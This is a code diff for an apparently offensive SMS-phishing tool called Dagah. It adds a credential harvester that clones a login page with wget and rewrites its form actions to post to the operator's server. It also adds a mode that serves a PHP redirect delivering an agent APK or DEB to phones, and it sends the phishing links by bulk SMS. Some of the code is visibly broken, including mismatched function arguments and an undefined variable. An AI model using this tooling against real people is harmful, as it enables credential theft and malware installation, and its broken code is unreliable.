@@ -5,11 +5,12 @@ import time
 import subprocess
 import signal
 import getopt
+import re
 from lib.config import Config
 from lib.db import DB, DBException
 config = Config('config')
 def usage():
-    print "Shevirah-Phish Usage:"
+    print "Dagah (Shevirah Phishing) Usage:"
     print "Options:"
     print "-M <type> of attach mobile modem (app/usb)"
     print "\t-n <phone number> of modem"
@@ -22,7 +23,9 @@ def usage():
     print "\t-p <page name>"
     print "\t-t <custom text> for SMS"
     print "\t-c <page> to clone for credential harvester"
+    print "\t-f <file> to import"
     print "\t-l <label> for campaign"
+    print "\t-a <appstore> link for hosted app (official or third party)"
     print "-A <API> Start API (REST)"
     print "\t-u <url on webserver> for API"
     print "\t-k <api key>"
@@ -33,7 +36,7 @@ def main(argv):
         usage()
         sys.exit()
     try:
-        opts, args = getopt.getopt(argv, "M:A:P:n:u:k:S:c:N:p:t:d:l:R:")
+        opts, args = getopt.getopt(argv, "M:A:P:n:u:k:S:c:N:p:t:d:l:R:f:a:")
     except getopt.GetoptError:
         usage()
         sys.exit()
@@ -44,11 +47,14 @@ def main(argv):
     report = False
     key = "KEYKEY1"
     url = "/modemtest"
-    page = "phish.php"
+    page = "/index.html"
+    clone = None
     campaignlabel = "blank"
-    number = None
+    number = None 
+    file = None
     numberfile = None
-    text = "This is a cool page: "
+    appstore = None
+    text = "This is a cool page:"
 
     for opt, arg in opts:
         if opt == '-M':
@@ -60,6 +66,7 @@ def main(argv):
 		phishtype = arg
         if opt == '-S':
 		stop = True
+		poller = arg
         if opt == '-R':
                 report = True
                 reporttype = arg
@@ -82,6 +89,13 @@ def main(argv):
                 deliverymethod = arg
         if opt == '-t':
                 text = arg
+        if opt == '-f':
+                file = arg
+        if opt == '-a':
+		appstore = arg
+        if opt == '-c':
+                clone = arg
+
         if opt == '-l':
                 campaignlabel = arg
     if modem == True:
@@ -96,39 +110,176 @@ def main(argv):
     if phish == True:
        if phishtype == "basic":
 	    basicphish(url,text,number,numberfile,campaignlabel)
+       if phishtype == "harvester":
+	    harvesterphish(url,text,number,numberfile,campaignlabel,clone,page)
+       if phishtype == "autoagent":
+	    autoagentphish(url,text,number,numberfile,page,appstore,text)
+
+
+def autoagentphish(url,text,number,numberfile,page,appstore):
+    webserver = config.get("WEBSERVER")
+    ipaddress = config.get("IPADDRESS")
+    androidagent = config.get("ANDROIDAGENT")
+    iphoneagent = config.get("IPHONEAGENT")
+    localpath = webserver + url
+    if not os.path.exists(localpath):
+            command1  = "mkdir " + localpath
+            os.system(command1)
+    pagetext = "<?php\n$iphone = strpos($_SERVER[\'HTTP_USER_AGENT\'],\"iPhone\");\n$android = strpos($_SERVER[\'HTTP_USER_AGENT\'],\"Android\");\nif\n($iphone == true)\n{header(\'Location: http://" + ipaddress + path + "/iphoneagent.deb\');}\nelseif ($android == true){\nheader(\'Location: http://" + ipaddress + path + "/androidagent.apk\');}"
+    sploitfile = localpath + page
+    command8   = "touch " + sploitfile
+    os.system(command8)
+    command9 = "chmod 777 " + sploitfile
+    os.system(command9)
+    SPLOITFILE = open(sploitfile, 'w')
+    SPLOITFILE.write(pagetext)
+    SPLOITFILE.close()
+    copy1 = "cp " + androidagent + " " + localpath + "/androidagent.apk"
+    copy2 = "cp " + iphoneagent + " " + localpath + "/iphoneagent.deb"
+    os.system(copy1)
+    os.system(copy2)
+    link = "http://" + ipaddress + url + page
+    if number != None:
+                fulltext = text + " " + link
+                sendsms(number,fulltext)
+    elif numberfile != None:
+                 with open(numberfile) as f:
+                    lines = f.readlines()
+                    for line in lines:
+                        line = line.strip()
+                        fulltext = text +" " +link
+                        sendsms(line,fulltext)
+
+
+
+def harvesterphish(url,text,number,numberfile,campaignlabel,clone,page):
+	 webserver = config.get('WEBSERVER')
+       	 ipaddress = config.get('IPADDRESS')
+         localpath = webserver + url
+         if not os.path.exists(localpath):
+            command1  = "mkdir " + localpath
+            os.system(command1)
+         results = localpath + "/results"
+         command8   = "touch " + results
+         os.system(command8)
+         command9 = "chmod 777 " + results
+         os.system(command9)
+         campaign_db(campaignlabel,url,"harvester")
+	 print clone
+	 if clone != None:
+             if clone[:7].lower() != "https:/" and clone[:7].lower() != "http://" :
+                clone = "http://" + clone
+	     clonepage(clone,url,page)
+	     dagahdir = os.getcwd()
+             clonesdir = config.get("CLONESLOC")
+             fullpath = dagahdir + "/" + clonesdir
+             copy2 = "cp " + fullpath + "/post.php " + webserver + url + "/post.php"
+	     os.system(copy2)
+	     read=file(webserver + url + "/post.php","r").readlines()
+	     write=file(webserver + url + "/post.php","w")
+             for line in read:
+	         match=re.search('url',line, flags=re.IGNORECASE)
+	         if match:
+        	      line=re.sub('url=MYURL', 'url=%s ' % (clone), line)
+	         write.write(line)
+             write.close()
+	     link = "http://" + ipaddress + url + page
+  	     if number != None:
+                fulltext = text + " " + link
+                sendsms(number,fulltext)
+       	     elif numberfile != None:
+                 with open(numberfile) as f:
+                    lines = f.readlines()
+                    for line in lines:
+                        line = line.strip()
+                        fulltext = text +" " +link
+                        sendsms(line,fulltext)
+		
+	
+def clonepage(clone,url,page):
+         dagahdir = os.getcwd()
+	 clonesdir = config.get("CLONESLOC")
+	 useragent = config.get("USERAGENT")
+	 fullpath = dagahdir + "/" + clonesdir
+         subprocess.Popen('cd %s;wget --no-check-certificate -O index.html -c -k -U "%s" "%s";' % (fullpath,useragent,clone), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+	 redirect(fullpath + "/index.html",url)
+         webserver = config.get("WEBSERVER")
+         copy1 = "cp " + fullpath + "/index.html" + " " + webserver + url + page
+	 os.system(copy1)
+	 remove = "rm " + fullpath + "/index.html"
+	 os.system(remove)
+
+def redirect(page,url):
+        ipaddress = config.get('IPADDRESS')
+	read=file(page,"r").readlines()
+	write=file(page,"w")
+	for line in read:
+		match=re.search('post',line, flags=re.IGNORECASE)
+		method_post=re.search("method=post", line, flags=re.IGNORECASE)
+		if match or method_post:
+        		line=re.sub('action="http?\w://[\w.\?=/&]*/', 'action="http://%s%s/post.php" ' % (ipaddress,url), line)
+		write.write(line)
+	write.close()
+
+
+
 
 def reporter(reporttype):
 	if reporttype.lower() == "drop": 
 		 db = DB(config=config)
 	
-                 db.query("DROP TABLE IF EXISTS basicresults")
-		 db.query("DROP TABLE IF EXISTS harvesterresults")
+                 db.query("DROP TABLE IF EXISTS results")
                  db.query("DROP TABLES IF EXISTS campaigns")
         if reporttype.lower() == "get":
                 webserver = config.get('WEBSERVER')
  		db = DB(config=config)
-		db.query("create table if not exists results (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, label varchar(1000), path varchar(1000), number varchar(12), timestamp varchar(1000), agent varchar(1000))")
+		db.query("create table if not exists basicresults (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, label varchar(1000), path varchar(1000), number varchar(12), timestamp varchar(1000), agent varchar(1000))")
         	row = db.fetchone()[0]
         	db.query("SELECT COUNT(*) from campaigns")
                 row = db.fetchone()[0]
 
         	for i in range(1, row+1):
-          		db.query("SELECT path from campaigns where id=%s", (i, ))
+          		db.query("SELECT path from campaigns where id=%s", (i))
            		url = db.fetchone()[0]
-                        db.query("SELECT label from campaigns where id=%s", (i, ))
+                        db.query("SELECT label from campaigns where id=%s", (i))
                         label = db.fetchone()[0]
-			filename = webserver + url + "/results"
-			print label + ":" 
-			with open(filename) as f:
-                   		lines = f.readlines()
-                   		for line in lines:
-                        		line = line.strip()
-					print line
-                                        stringsplit = line.split(" ",2)
-                                        timestamp = stringsplit[0]
-                                        number = stringsplit[1]
-                                        agent = stringsplit[2]
-                                        db.query("INSERT INTO results (id,label,path,number,timestamp,agent) VALUES (DEFAULT, %s, %s,%s,%s,%s)", (label , url, number, timestamp, agent))
+		        db.query("SELECT type from campaigns where id=%s", (i))
+			type = db.fetchone()[0]
+			if type == "basic":
+				filename = webserver + url + "/results"
+				print label + ":" 
+				with open(filename) as f:
+                   			lines = f.readlines()
+                   			for line in lines:
+                        			line = line.strip()
+						print line
+                                        	stringsplit = line.split(" ",2)
+                                        	timestamp = stringsplit[0]
+                                        	number = stringsplit[1]
+                                        	agent = stringsplit[2]
+                                        	db.query("INSERT INTO basicresults (id,label,path,number,timestamp,agent) VALUES (DEFAULT, %s, %s,%s,%s,%s)", (label , url, number, timestamp, agent))
+			
+		db.query("create table if not exists harvesterresults (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, label varchar(1000), path varchar(1000), creds varchar(60000))")
+        	row = db.fetchone()[0]
+        	db.query("SELECT COUNT(*) from campaigns")
+                row = db.fetchone()[0]
+        	for i in range(1, row+1):
+          		db.query("SELECT path from campaigns where id=%s", (i))
+           		url = db.fetchone()[0]
+                        db.query("SELECT label from campaigns where id=%s", (i))
+                        label = db.fetchone()[0]
+			db.query("SELECT type from campaigns where id=%s", (i))
+			type = db.fetchone()[0]
+			if type == "harvester":
+				filename = webserver + url + "/results"
+				print label + ":" 
+				with open(filename) as f:
+                   			lines = f.readlines()
+					mylines = '-'.join(lines)
+                   			arrayoflines = mylines.split("Array")
+					for j in range(0,len(arrayoflines)):
+						print arrayoflines[j]
+                                        	db.query("INSERT INTO harvesterresults (id,label,path,creds) VALUES (DEFAULT, %s, %s,%s)", (label , url, arrayoflines[j]))
 
 
 					
@@ -147,11 +298,11 @@ def basicphish(url,text,number,numberfile,campaignlabel):
        os.system(command8)
        command9 = "chmod 777 " + results
        os.system(command9)
-       campaign_db(campaignlabel,url)
+       campaign_db(campaignlabel,url,"basic")
        if number != None:
 	     makephishpage(number,url)
              fulllink = "http://" + ipaddress + url + "/" + number + ".php"
-             fulltext = text + fulllink
+             fulltext = text +" "+  fulllink
 	     sendsms(number,fulltext)
        elif numberfile != None:
 	     with open(numberfile) as f:
@@ -160,7 +311,7 @@ def basicphish(url,text,number,numberfile,campaignlabel):
 			line = line.strip()
 			makephishpage(line,url)
                         fulllink = "http://" + ipaddress + url + "/" + line + ".php"
-                        fulltext = text + fulllink
+                        fulltext = text +" "+ fulllink
 	                sendsms(line,fulltext)
 
 def sendsms(number,text):
@@ -237,7 +388,7 @@ def make_apifiles(path):
     os.system(command10)
     command11 = "chmod 777 " + getfuncupload
     os.system(command11)
-    getfuncuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('getfunc', 'wb');\nfwrite($file, $base);\n?>";
+    getfuncuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('getfunc', 'a');\nfwrite($file, $base);\n?>";
     GETFUNCUPLOADFILE = open(getfuncupload, 'w')
     GETFUNCUPLOADFILE.write(getfuncuploadtext)
     GETFUNCUPLOADFILE.close()
@@ -246,7 +397,7 @@ def make_apifiles(path):
     os.system(command10)
     command11 = "chmod 777 " + putfuncupload
     os.system(command11)
-    putfuncuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('putfunc', 'wb');\nfwrite($file, $base);\n?>";
+    putfuncuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('putfunc', 'a');\nfwrite($file, $base);\n?>";
     PUTFUNCUPLOADFILE = open(putfuncupload, 'w')
     PUTFUNCUPLOADFILE.write(putfuncuploadtext)
     PUTFUNCUPLOADFILE.close()
@@ -276,7 +427,7 @@ def make_modem(number,url,key):
         pid = os.fork()
         if pid == 0:
                 os.system(startcommand) 
-def campaign_db(label,url):
+def campaign_db(label,url,type):
     if check_mysql() == 0:
 	os.system("service mysql start")
     try:
@@ -290,8 +441,8 @@ def campaign_db(label,url):
     db = DB(config=config)
 
    
-    db.query("create table if not exists campaigns (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, label varchar(1000), path varchar(1000))")
-    db.query("INSERT INTO campaigns (id,label,path) VALUES (DEFAULT, %s, %s)", (label , url))
+    db.query("create table if not exists campaigns (id INT NOT NULL AUTO_INCREMENT PRIMARY KEY, label varchar(1000),type varchar (1000), path varchar(1000))")
+    db.query("INSERT INTO campaigns (id,label,type,path) VALUES (DEFAULT, %s, %s, %s)", (label,type,url))
 
 
 def database_add2(number, path, key, _type):
